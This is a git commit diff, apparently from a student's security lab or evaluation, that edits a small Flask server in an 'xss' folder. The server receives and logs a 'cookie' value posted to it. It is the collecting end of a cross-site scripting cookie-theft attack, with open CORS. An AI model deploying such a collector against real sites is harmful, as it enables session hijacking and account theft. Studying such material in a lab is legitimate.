fbdfeeae773906f9d74727cbfd321edc31dd3085
juanb <juancruzberrios73@gmail.com>
2025-02-25 11:57:33 -0300

    primeros intentos eval2

--- xss/sever/server.py
+++ xss/sever/server.py
@@ -4,14 +4,11 @@ from flask_cors import CORS
 app = Flask(__name__)
 CORS(app)  # This allows all origins; not suitable if sending credentials.
 
-@app.route('/', methods=['POST'])
+@app.route('/fetch', methods=['POST'])
 def fetch_cookie():
-    cookie_value = request.args.get('cookie')
+    cookie_value = request.form.get('cookie')
     print("Cookie received:", cookie_value)
-    
-    response = make_response(f"Received cookie: {cookie_value}", 200)
-    response.headers['Access-Control-Allow-Origin'] = '*'
-    return response
+    return f"Received cookie: {cookie_value}", 200
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
